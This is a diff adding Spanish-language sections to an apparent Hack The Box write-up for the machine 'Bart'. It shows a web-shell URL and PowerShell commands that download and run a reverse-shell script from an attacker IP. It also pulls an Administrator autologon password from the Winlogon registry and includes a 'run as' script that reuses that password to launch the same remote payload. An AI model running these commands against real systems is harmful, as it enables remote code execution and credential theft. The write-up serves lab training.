@@ -165,8 +165,45 @@ Siempre es importante pasarse a la arquitecura de 64 por lo que la manera mas fa
 
 
 
+### Reverse shell de 32 a 64
+
+Lo que note cuando hice esta pagina es que el proceso donde se obtiene la shell es de 32 por lo que lo mejor es pasarlo a 64 logre esto  llamando al powershell desde la ruta de 32 a 64..
+
+```
+http://internal-01.bart.htb/log/log1.php?cmd=C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe%20iex(new-object%20net.webclient).downloadstring(%27http://10.10.14.12/Invoke-PowerShellTcp.ps1%27)
+
+C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.12/Invoke-PowerShellTcp.ps1')
+```
+
+## Auto logon WinLogon 
+
+Puedes checar si estan confuguradas algunas credenciales para autologon 
+
+![image](https://github.com/gecr07/Bart-HTB/assets/63270579/a36742ef-4d95-4ef8-aa49-c716e0dc10d7)
 
 
+```
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+   LastUsedUsername    REG_SZ    Administrator
+    DefaultPassword    REG_SZ    3130438f31186fbaf962f407711faddb
+
+
+```
+
+### Powershell “run as”
+
+Que quiere decir correr como eso quiere decir que lo vas a correr en la maquina victima vas a correr un comando como otro usuario en el caso de la maquina bart pues como Administrator ya que tenemos el password:
+
+```
+$username = "BART\Administrator"
+$password = "3130438f31186fbaf962f407711faddb"
+$secstr = New-Object -TypeName System.Security.SecureString
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1') } -Credential $cred -Computer localhost
+
+```
 
 
 
